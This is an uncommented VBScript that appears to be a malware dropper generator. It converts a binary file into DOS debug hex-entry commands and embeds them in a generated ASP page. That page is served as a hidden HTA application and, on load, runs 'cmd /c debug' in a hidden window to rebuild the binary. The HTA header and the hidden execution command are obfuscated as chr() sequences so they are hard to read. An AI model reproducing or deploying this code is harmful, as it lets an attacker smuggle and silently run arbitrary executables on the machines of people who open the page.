Option Explicit
Dim oFs, oShell, inBin, outAsp, fObj, strm, hexBuf, outDoc, rowIdx, rowHex

Set oFs = CreateObject("Scripting.FileSystemObject")
Set oShell = CreateObject("WScript.Shell")

inBin = "C:\temp\input.bin"
outAsp = "C:\temp\stage.asp"

Function WordToPairs(ch)
    Dim h
    h = Hex(AscW(ch))
    Do While Len(h) < 4
        h = "0" & h
    Loop
    WordToPairs = Right(h, 2) & " " & Left(h, 2) & " "
End Function

If oFs.FileExists(inBin) Then
    Set fObj = oFs.GetFile(inBin)
    If fObj.Size <= 65279 Then
        Set strm = fObj.OpenAsTextStream(1, -1)
        hexBuf = ""
        Do While Not strm.AtEndOfStream
            hexBuf = hexBuf & WordToPairs(strm.Read(1))
        Loop
        strm.Close

        Dim hdr, midRun
        hdr = chr(60) + chr(37) + chrw(82) + chr(101) + chr(115) + chr(112) + chr(111) + chr(110) + chr(115) + chr(101) + chr(46) + chr(67) + chr(111) + chr(110) + chr(116) + chr(101) + chr(110) + chr(116) + chr(84) + chr(121) + chr(112) + chr(101) + chr(61) + chr(34) + chr(97) + chr(112) + chr(112) + chr(108) + chr(105) + chr(99) + chr(97) + chr(116) + chr(105) + chr(111) + chr(110) + chr(47) + chr(104) + chr(116) + chr(97) + chr(34) + chr(37) + chr(62)
        hdr = hdr + chr(60) + chrw(104) + chr(116) + chr(97) + chr(58) + chr(97) + chr(112) + chr(112) + chr(108) + chr(105) + chr(99) + chr(97) + chr(116) + chr(105) + chr(111) + chr(110) + chr(32) + chr(115) + chr(104) + chr(111) + chr(119) + chr(105) + chr(110) + chr(116) + chr(97) + chr(115) + chr(107) + chr(98) + chr(97) + chr(114) + chr(61) + chr(34) + chr(110) + chr(111) + chr(34) + chr(62)

        midRun = chr(115) + chr(104) + chr(46) + chrw(114) + chr(117) + chr(110) + chr(32) + chr(34) + chr(99) + chr(109) + chr(100) + chr(32) + chr(47) + chr(99) + chr(32) + chr(100) + chr(101) + chr(98) + chr(117) + chr(103) + chr(60) + chr(34) + chr(38) + chr(116) + chr(44) + chr(48) + chr(44) + chr(48)

        Set outDoc = oFs.CreateTextFile(outAsp, True)
        outDoc.WriteLine hdr
        For rowIdx = 1 To (Len(hexBuf) \ 48)
            rowHex = Hex((rowIdx - 1) * 16 + &H100)
            outDoc.WriteLine "s.Write ""e" & rowHex & " " & Mid(hexBuf, (rowIdx - 1) * 48 + 1, 47) & """"
        Next
        outDoc.WriteLine "s.Write ""rcx"""
        outDoc.WriteLine "s.Write """ & Hex(fObj.Size) & """"
        outDoc.WriteLine midRun
        outDoc.Close
    End If
End If
